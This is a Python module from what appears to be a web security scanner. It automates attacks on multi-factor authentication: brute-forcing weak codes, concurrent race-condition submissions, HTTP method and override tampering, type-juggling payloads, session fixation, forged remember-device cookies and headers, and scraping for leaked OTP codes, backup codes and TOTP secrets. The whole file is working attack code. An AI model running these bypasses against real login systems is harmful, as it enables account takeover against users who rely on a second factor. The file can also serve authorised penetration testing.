import re
import json
import time
import asyncio
from urllib.parse import urljoin, urlparse
from modules.base import BaseModule
from core.utils import random_string


class MfaModule(BaseModule):
    name = "mfa"
    description = "Multi-Factor Authentication Bypass Scanner"
    exploitable = True
    
    mfa_endpoints = [
        "/2fa", "/2fa/verify", "/mfa", "/mfa/verify", "/auth/2fa", "/auth/mfa",
        "/login/2fa", "/verify", "/verify-code", "/otp", "/otp/verify",
        "/totp", "/totp/verify", "/api/2fa/verify", "/api/mfa/verify",
        "/two-factor", "/second-factor",
    ]
    
    weak_codes = [
        "000000", "111111", "123456", "654321", "999999", "888888",
        "777777", "666666", "012345", "123123", "121212", "696969",
        "1234", "0000", "1111",
    ]
    
    async def scan(self, target):
        self.findings = []
        self.bypassed = False
        base_url = self._get_base_url(target)
        
        mfa_urls = await self._discover_mfa_endpoints(base_url)
        
        for mfa_url in mfa_urls:
            await self._test_code_bypass(mfa_url)
            await self._test_empty_code(mfa_url)
            await self._test_rate_limiting(mfa_url)
            await self._test_response_manipulation(mfa_url)
            await self._test_backup_codes(mfa_url)
            await self._test_recovery_code_brute(mfa_url)
            await self._test_remember_device_bypass(mfa_url)
            await self._test_direct_access(mfa_url, base_url)
            
            if self.aggressive:
                await self._test_time_based_bypass(mfa_url)
                await self._test_session_fixation(mfa_url, base_url)
                await self._test_race_condition_bypass(mfa_url)
                await self._test_method_switching(mfa_url)
                await self._test_sms_interception(mfa_url, base_url)
        
        await self._test_mfa_setup(base_url)
        
        return self.findings
    
    async def _test_time_based_bypass(self, mfa_url):
        current_time = int(time.time())
        time_windows = [
            current_time - 30,
            current_time - 60,
            current_time - 90,
            current_time + 30,
            current_time + 60,
        ]
        
        for ts in time_windows:
            resp = await self.http.post(
                mfa_url,
                data={"code": "000000", "timestamp": ts},
                headers={"X-Timestamp": str(ts)}
            )
            
            if self._check_bypass_success(resp):
                self.add_finding(
                    "CRITICAL",
                    "2FA Time-Based Bypass",
                    url=mfa_url,
                    evidence=f"Code accepted with manipulated timestamp: {ts}",
                    confidence_evidence=["time_bypass", "mfa_bypassed"],
                    request_data={"method": "POST", "url": mfa_url, "timestamp": ts}
                )
                self.bypassed = True
                return
    
    async def _test_session_fixation(self, mfa_url, base_url):
        resp1 = await self.http.get(urljoin(base_url, "/login"))
        if not resp1.get("status"):
            return
        
        cookies = resp1.get("headers", {}).get("set-cookie", "")
        session_match = re.search(r'(session[^=]*|PHPSESSID|JSESSIONID)=([^;]+)', cookies, re.I)
        
        if session_match:
            session_name = session_match.group(1)
            fixed_session = "fixedsession12345"
            
            resp = await self.http.post(
                mfa_url,
                data={"code": "000000"},
                headers={"Cookie": f"{session_name}={fixed_session}"}
            )
            
            if resp.get("status") in [200, 302]:
                new_cookies = resp.get("headers", {}).get("set-cookie", "")
                if fixed_session in new_cookies or f"{session_name}=" not in new_cookies:
                    self.add_finding(
                        "HIGH",
                        "2FA Session Fixation Possible",
                        url=mfa_url,
                        evidence="Session not regenerated after 2FA attempt",
                        confidence_evidence=["session_fixation", "session_not_rotated"],
                        request_data={"method": "POST", "url": mfa_url}
                    )
    
    async def _test_race_condition_bypass(self, mfa_url):
        codes = ["000000", "111111", "222222", "333333", "444444", 
                 "555555", "666666", "777777", "888888", "999999"]
        
        tasks = []
        for code in codes:
            tasks.append(self.http.post(mfa_url, data={"code": code}))
        
        responses = await asyncio.gather(*tasks, return_exceptions=True)
        
        success_count = 0
        for resp in responses:
            if isinstance(resp, dict) and self._check_bypass_success(resp):
                success_count += 1
        
        if success_count > 0:
            self.add_finding(
                "CRITICAL",
                "2FA Race Condition Bypass",
                url=mfa_url,
                evidence=f"{success_count}/10 concurrent requests succeeded",
                confidence_evidence=["race_condition", "concurrent_bypass"],
                request_data={"method": "POST", "url": mfa_url, "concurrent_requests": 10}
            )
            self.bypassed = True
    
    async def _test_method_switching(self, mfa_url):
        methods_to_test = [
            ("PUT", {"code": "000000"}),
            ("PATCH", {"code": "000000"}),
            ("DELETE", {}),
            ("OPTIONS", {}),
        ]
        
        for method, data in methods_to_test:
            resp = await self.http.request(method, mfa_url, data=data if data else None)
            
            if self._check_bypass_success(resp):
                self.add_finding(
                    "CRITICAL",
                    f"2FA Bypass via HTTP Method ({method})",
                    url=mfa_url,
                    evidence=f"2FA bypassed using {method} request",
                    confidence_evidence=["method_bypass", "http_verb_tampering"],
                    request_data={"method": method, "url": mfa_url}
                )
                self.bypassed = True
                return
        
        resp = await self.http.post(
            mfa_url,
            data={"code": "000000"},
            headers={"X-HTTP-Method-Override": "DELETE"}
        )
        if self._check_bypass_success(resp):
            self.add_finding(
                "CRITICAL",
                "2FA Bypass via X-HTTP-Method-Override",
                url=mfa_url,
                evidence="Method override header accepted",
                confidence_evidence=["method_override", "mfa_bypassed"]
            )
    
    async def _test_sms_interception(self, mfa_url, base_url):
        sms_endpoints = [
            "/api/sms/send",
            "/api/otp/send",
            "/2fa/resend",
            "/mfa/resend",
            "/verify/resend",
        ]
        
        for endpoint in sms_endpoints:
            url = urljoin(base_url, endpoint)
            
            resp = await self.http.post(url, data={"phone": "+15551234567"})
            
            if resp.get("status") == 200:
                text = resp.get("text", "")
                
                code_patterns = [
                    r'"code"\s*:\s*"?(\d{4,8})"?',
                    r'"otp"\s*:\s*"?(\d{4,8})"?',
                    r'"verification_code"\s*:\s*"?(\d{4,8})"?',
                    r'code=(\d{4,8})',
                ]
                
                for pattern in code_patterns:
                    match = re.search(pattern, text)
                    if match:
                        self.add_finding(
                            "CRITICAL",
                            "2FA Code Leaked in API Response",
                            url=url,
                            evidence=f"OTP code visible: {match.group(1)[:3]}***",
                            confidence_evidence=["otp_leaked", "sms_interception"],
                            request_data={"method": "POST", "url": url}
                        )
                        return
        
        log_endpoints = ["/logs", "/api/logs", "/debug", "/api/debug"]
        for endpoint in log_endpoints:
            url = urljoin(base_url, endpoint)
            resp = await self.http.get(url)
            
            if resp.get("status") == 200:
                text = resp.get("text", "")
                if re.search(r'(otp|verification|2fa).*\d{4,8}', text, re.I):
                    self.add_finding(
                        "CRITICAL",
                        "2FA Codes Visible in Debug Logs",
                        url=url,
                        evidence="OTP codes found in application logs",
                        confidence_evidence=["otp_in_logs", "debug_exposure"]
                    )
    
    def _get_base_url(self, url):
        parsed = urlparse(url)
        return f"{parsed.scheme}://{parsed.netloc}"
    
    async def _discover_mfa_endpoints(self, base_url):
        found = []
        
        for endpoint in self.mfa_endpoints:
            url = urljoin(base_url, endpoint)
            resp = await self.http.get(url)
            
            if resp.get("status") in [200, 401, 403]:
                text = resp.get("text", "").lower()
                
                if any(x in text for x in ["2fa", "mfa", "verify", "code", "otp", "authenticator", "factor"]):
                    found.append(url)
                    self.log(f"[MFA] Found endpoint: {endpoint}")
        
        return found
    
    async def _test_code_bypass(self, mfa_url):
        random_token = random_string(32)
        bypass_values = [
            {"code": ""}, {"code": None}, {"code": "null"}, {"code": "undefined"},
            {"code": "skip"}, {"code": "bypass"}, {"code": "true"}, {"code": "1"},
            {"code[]": ""}, {"code": ["000000", "111111"]},
            {"code": 0}, {"code": True}, {"code": []}, {"code": {}},
            {"code": random_token}, {"token": random_token, "code": "000000"},
        ]
        
        for payload in bypass_values:
            resp = await self.http.post(mfa_url, data=payload)
            if self._check_bypass_success(resp):
                self.add_finding(
                    "CRITICAL",
                    "2FA Bypass - Special Value Accepted",
                    url=mfa_url,
                    evidence=f"Bypassed with: {payload}"
                )
                return
            
            try:
                resp = await self.http.post(mfa_url, json=payload)
                if self._check_bypass_success(resp):
                    self.add_finding(
                        "CRITICAL",
                        "2FA Bypass - JSON Manipulation",
                        url=mfa_url,
                        evidence=f"Bypassed with JSON: {payload}"
                    )
                    return
            except:
                pass
    
    async def _test_empty_code(self, mfa_url):
        resp = await self.http.post(mfa_url)
        if self._check_bypass_success(resp):
            self.add_finding(
                "CRITICAL",
                "2FA Bypass - Empty Submission Accepted",
                url=mfa_url,
                evidence="2FA can be bypassed by sending empty POST"
            )
            return
        
        resp = await self.http.get(mfa_url + "?verify=1")
        if self._check_bypass_success(resp):
            self.add_finding(
                "CRITICAL",
                "2FA Bypass - GET Request Bypasses Verification",
                url=mfa_url,
                evidence="2FA skipped with GET request"
            )
    
    async def _test_rate_limiting(self, mfa_url):
        attempts = 0
        blocked = False
        
        for code in self.weak_codes[:10]:
            resp = await self.http.post(mfa_url, data={"code": code})
            attempts += 1
            
            if resp.get("status") == 429:
                blocked = True
                break
            
            if resp.get("status") in [403, 401]:
                text = resp.get("text", "").lower()
                if any(x in text for x in ["locked", "blocked", "too many", "rate limit"]):
                    blocked = True
                    break
            
            if self._check_bypass_success(resp):
                self.add_finding(
                    "CRITICAL",
                    "2FA Weak Code Accepted",
                    url=mfa_url,
                    evidence=f"Code {code} was accepted"
                )
                return
        
        if not blocked and attempts >= 10:
            self.add_finding(
                "HIGH",
                "2FA No Rate Limiting - Brute Force Possible",
                url=mfa_url,
                evidence=f"Sent {attempts} requests without being blocked"
            )
    
    async def _test_response_manipulation(self, mfa_url):
        resp = await self.http.post(mfa_url, data={"code": "999999"})
        
        if resp.get("status") == 200:
            text = resp.get("text", "")
            
            try:
                data = json.loads(text)
                if "success" in data or "verified" in data or "valid" in data:
                    self.add_finding(
                        "MEDIUM",
                        "2FA Response Shows Verification Status",
                        url=mfa_url,
                        evidence=f"Response contains: {list(data.keys())[:5]}"
                    )
            except:
                pass
        
        if resp.get("status") == 401:
            self.add_finding(
                "LOW",
                "2FA Uses Status Codes for Verification",
                url=mfa_url,
                evidence="401 returned for invalid code"
            )
    
    async def _test_backup_codes(self, mfa_url):
        base_url = self._get_base_url(mfa_url)
        
        backup_endpoints = [
            "/2fa/backup", "/mfa/backup", "/backup-codes",
            "/recovery-codes", "/api/2fa/backup",
        ]
        
        for endpoint in backup_endpoints:
            url = urljoin(base_url, endpoint)
            resp = await self.http.get(url)
            
            if resp.get("status") == 200:
                text = resp.get("text", "")
                code_pattern = r'\b\d{6,8}\b'
                codes = re.findall(code_pattern, text)
                
                if len(codes) >= 3:
                    self.add_finding(
                        "CRITICAL",
                        "2FA Backup Codes Exposed",
                        url=url,
                        evidence=f"Found {len(codes)} potential backup codes in response"
                    )
                    return
        
        weak_backup = ["000000", "111111", "123456", "AAAAAA", "backup", "recovery"]
        
        for code in weak_backup:
            resp = await self.http.post(mfa_url, data={"code": code, "type": "backup"})
            
            if self._check_bypass_success(resp):
                self.add_finding(
                    "CRITICAL",
                    "2FA Weak Backup Code Accepted",
                    url=mfa_url,
                    evidence=f"Backup code '{code}' was accepted"
                )
                return

    async def _test_recovery_code_brute(self, mfa_url):
        recovery_codes = ["000000", "111111", "123456", "654321", "999999", "123123", "121212", "000001", "123450"]
        for code in recovery_codes:
            resp = await self.http.post(mfa_url, data={"code": code, "type": "recovery"})
            if self._check_bypass_success(resp):
                self.add_finding(
                    "CRITICAL",
                    "2FA recovery code brute-forced or weak code accepted",
                    url=mfa_url,
                    evidence=f"Recovery code '{code}' accepted"
                )
                return
        resp = await self.http.post(mfa_url, data={"code": "000000", "recovery": "true"})
        if self._check_bypass_success(resp):
            self.add_finding(
                "HIGH",
                "2FA recovery flow accepts weak/default code",
                url=mfa_url,
                evidence="recovery=true with 000000 accepted"
            )

    async def _test_remember_device_bypass(self, mfa_url):
        resp = await self.http.get(mfa_url)
        if not resp.get("status"):
            return
        cookies = resp.get("headers", {}).get("Set-Cookie", "")
        remember_headers = {"X-Remember-Device": "true", "X-Trust-Device": "1", "Remember-Device": "1"}
        for hname, hval in remember_headers.items():
            r = await self.http.get(mfa_url, headers={hname: hval})
            if r.get("status") == 200:
                text = (r.get("text") or "").lower()
                if "verify" not in text and "code" not in text and ("dashboard" in text or "welcome" in text):
                    self.add_finding(
                        "HIGH",
                        "2FA bypass via remember-device header",
                        url=mfa_url,
                        evidence=f"Header {hname}={hval} may skip verification"
                    )
                    return
        bypass_cookies = [
            ("mfa_trusted", "1"), ("device_trusted", "true"), ("2fa_skip", "1"),
            ("remember_device", "1"), ("trusted_device", "true"),
        ]
        for cname, cval in bypass_cookies:
            r = await self.http.get(mfa_url, headers={"Cookie": f"{cname}={cval}"})
            if r.get("status") == 200:
                text = (r.get("text") or "").lower()
                if "verify" not in text and "code" not in text and ("dashboard" in text or "welcome" in text):
                    self.add_finding(
                        "HIGH",
                        "2FA bypass via remember-device cookie",
                        url=mfa_url,
                        evidence=f"Cookie {cname}={cval} may skip verification"
                    )
                    return
    
    async def _test_direct_access(self, mfa_url, base_url):
        protected_pages = [
            "/dashboard", "/account", "/profile", "/settings",
            "/admin", "/home", "/api/user", "/api/profile",
        ]
        
        for page in protected_pages:
            url = urljoin(base_url, page)
            resp = await self.http.get(url)
            
            if resp.get("status") == 200:
                text = resp.get("text", "").lower()
                
                if any(x in text for x in ["dashboard", "account", "profile", "settings", "welcome"]):
                    if "login" not in text and "2fa" not in text and "verify" not in text:
                        self.add_finding(
                            "HIGH",
                            "2FA Bypass - Direct Page Access",
                            url=url,
                            evidence=f"Protected page accessible without 2FA completion"
                        )
                        return
    
    async def _test_mfa_setup(self, base_url):
        setup_endpoints = [
            "/2fa/setup", "/mfa/setup", "/2fa/enable",
            "/mfa/enable", "/settings/2fa", "/api/2fa/setup",
        ]
        
        for endpoint in setup_endpoints:
            url = urljoin(base_url, endpoint)
            resp = await self.http.get(url)
            
            if resp.get("status") == 200:
                text = resp.get("text", "")
                
                secret_patterns = [
                    r'secret["\s:=]+([A-Z2-7]{16,32})',
                    r'otpauth://totp/[^"]+secret=([A-Z2-7]+)',
                    r'TOTP.*?([A-Z2-7]{16,32})',
                ]
                
                for pattern in secret_patterns:
                    match = re.search(pattern, text, re.IGNORECASE)
                    if match:
                        self.add_finding(
                            "HIGH",
                            "2FA TOTP Secret Exposed in Response",
                            url=url,
                            evidence=f"Secret visible: {match.group(1)[:10]}..."
                        )
                        break
                
                if "data:image" in text and "otpauth" in text:
                    self.add_finding(
                        "MEDIUM",
                        "2FA Setup Shows QR Code with Secret",
                        url=url,
                        evidence="QR code contains TOTP secret"
                    )
    
    def _check_bypass_success(self, resp):
        if not resp.get("status"):
            return False
        
        if resp.get("status") in [200, 302, 303, 307]:
            text = resp.get("text", "").lower()
            headers = resp.get("headers", {})
            
            success_indicators = ["dashboard", "welcome", "success", "verified", "logged in", "home"]
            
            if any(x in text for x in success_indicators):
                if "error" not in text and "invalid" not in text and "wrong" not in text:
                    return True
            
            location = headers.get("location", "").lower()
            if any(x in location for x in ["/dashboard", "/home", "/account", "/profile"]):
                return True
            
            set_cookie = headers.get("set-cookie", "").lower()
            if "session" in set_cookie or "auth" in set_cookie:
                if "2fa" not in set_cookie and "verify" not in set_cookie:
                    return True
        
        return False
